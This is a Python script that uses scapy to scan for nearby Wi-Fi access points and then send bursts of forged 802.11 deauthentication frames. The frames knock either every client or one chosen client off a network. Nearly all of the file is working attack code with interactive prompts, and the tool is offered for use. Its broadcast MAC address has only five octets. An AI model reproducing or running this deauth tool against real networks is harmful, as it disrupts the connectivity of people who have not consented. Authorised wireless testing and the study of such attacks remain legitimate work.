#Written by Skittles_

#imports the libraries needed to function
from scapy.all import *
import colors


#initialize variables used for selecting hardware, targets
interface = ''
client = ''
accessPoint = ''

def wifiDeauthAP():
  #getting the information from user, interface, client, and Access Point mac addresses
  interface = input(colors.blue('What interface would you like to use for deauth?:\n????>'))
  print(colors.red('OK, ' + interface))
  print('Press Ctrl+C when done.')
  scanForTarget()

  client = 'FF:FF:FF:FF:FF'

  accessPoint = input(colors.blue('Input the Access Point\'s BSSID (MAC Address)\nSKWD>'))
  print(colors.red('OK, ' + accessPoint))
  #From here, we print out the info, to make sure the info is correct than we start with deauth, or exit SKWifiDeath

  print('__________________________________________________')
  print('Just to be sure, here is are the current settings:\nMonitor Mode Interface:' + interface + '\nClient: All Clients\nAccess Point:' + accessPoint)
  print('__________________________________________________')

  correct = input(colors.blue('Is this correct? (yes/y no/n):\n????>'))

  def deauthRouter():
    print('Building the packet.')
    #using scapy to craft and send deauth packet
    dot11 = Dot11(addr1=client, addr2=accessPoint, addr3=accessPoint)
    # stack the packet up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    print('Packet ready.')
    # send the packet
    print('Sending packets.')
    sendp(packet, inter=0.1, count=200, iface=interface, verbose=1)

  if correct == 'y':
    print(colors.green('Alright. Starting Deauth...'))
    deauthRouter()

  elif correct == 'n':
    print(colors.yellow('Exiting...'))
    sys.exit()

def wifiDeauthClient():

  #getting the information from user, interface, client, and Access Point mac addresses
  interface = input(colors.blue('What Monitor mode interface would you like to use to deauth?:\n????>'))
  print(colors.red('OK, ' + interface))

  client = input(colors.blue('What is the client\'s BSSID (MAC Address)\nSKWD>'))
  print(colors.red('OK, ' + client))
  print('Press Ctrl+C when done.')
  scanForTarget()

  accessPoint = input(colors.blue('What is the Access Point\'s BSSID (MAC Address)\nSKWD>'))
  print(colors.red('OK, ' + accessPoint))
  #From here, we print out the info, to make sure the info is correct than we start with deauth, or exit SKWifiDeath

  print('__________________________________________________')
  print('Just to be sure, here is are the current settings:\nMonitor Mode Interface:' + interface + '\nClient:' + client + '\nAccess Point:' + accessPoint)
  print('__________________________________________________')

  correct = input(colors.red('Is this correct? (yes/y no/n):\n????>'))
  def deauthClient():
    print('Building the packet.')
    #using scapy to craft anf send deauth packet, thanks Abdou Rockikz!
    dot11 = Dot11(addr1=client, addr2=accessPoint, addr3=accessPoint)
    # stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    print('Packet ready.')
    # send the packet
    print('Sending packets')
    sendp(packet, inter=0.1, count=200, iface=interface, verbose=1)

  if correct == 'y':
    print('Alright. Starting Deauth...')
    deauthClient()
  elif correct == 'n':
    print('Exiting...')
    sys.exit()


#scans for beacon frames, prints them to the screen
def scanForTarget():
    interface = input(colors.blue('What Monitor mode interface would you like to use to scan?\n????>'))
    ap_list = []

    def PacketHandler(packet):
        if packet.haslayer(Dot11Beacon):
            if packet.type == 0 and packet.subtype == 8:
                if packet.addr2 not in ap_list:
                    ap_list.append(packet.addr2)
                    print("MAC:", packet.addr2, " SSID:", packet.info)
                    print(ap_list)

    sniff(count=10000, iface=interface, prn = PacketHandler)

#Feature coming soon, checks whether or not a selected interface is in monitor mode, as it is required
#to send deauth packets. -SK
def monitorModeCheck():
  print('test, monitorModeCheck.')
#Written by Skittles_
